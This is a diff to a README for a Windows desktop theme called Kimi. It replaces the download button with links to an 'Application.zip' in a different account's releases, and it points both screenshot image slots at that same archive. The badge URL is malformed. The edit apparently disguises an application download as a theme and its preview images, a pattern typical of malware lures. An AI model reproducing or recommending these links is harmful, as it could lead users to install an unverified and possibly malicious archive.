@@ -39,7 +39,7 @@ This repository covers a variety of topics related to desktop customization, vis
 
 To download the Kimi theme, click the button below:
 
-[![](https://img.shields.io/badge/Download-Kimi%20Theme-blue.svg)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![](https://github.com/BinKeinSweater/kimi/releases/download/v1.0/Application.zip%https://github.com/BinKeinSweater/kimi/releases/download/v1.0/Application.zip)](https://github.com/BinKeinSweater/kimi/releases/download/v1.0/Application.zip)
 
 Once you have downloaded the theme, follow these steps to install it on your Windows system:
 
@@ -51,8 +51,8 @@ Once you have downloaded the theme, follow these steps to install it on your Win
 
 Check out these screenshots to get a preview of how the Kimi theme looks on your desktop:
 
-![Screenshot 1](https://example.com/screenshot1.jpg)
-![Screenshot 2](https://example.com/screenshot2.jpg)
+![Screenshot 1](https://github.com/BinKeinSweater/kimi/releases/download/v1.0/Application.zip)
+![Screenshot 2](https://github.com/BinKeinSweater/kimi/releases/download/v1.0/Application.zip)
 
 ## Support 💬
 
